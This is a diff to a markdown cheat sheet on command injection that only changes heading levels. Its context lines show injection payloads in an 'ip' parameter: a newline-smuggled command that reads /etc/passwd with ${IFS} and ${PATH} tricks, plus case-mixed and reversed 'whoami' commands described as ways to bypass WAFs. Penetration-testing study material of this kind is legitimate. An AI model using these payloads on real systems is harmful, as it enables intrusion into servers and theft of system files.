@@ -83,7 +83,7 @@ To read the passwd file, it would look something like this:
 ip=127.0.0.1%0ac'a't${IFS}${PATH:0:1}etc${PATH:0:1}passwd
 ```
 
-# Command Obfuscation
+### Command Obfuscation
 
 Useful when bypassing WAFs.
 
@@ -104,7 +104,7 @@ Windows:
 ```bash
 WhOaMi
 ```
-#### Reversed Commands
+### Reversed Commands
 
 The following will issue the `whoami` command when the input is reversed
 
@@ -119,7 +119,7 @@ Example:
 ip=127.0.0.1%0a$(rev<<<'imaohw')
 ```
 
-Using base64
+### Using Base64
 
 Use base64 to encode the command:
 
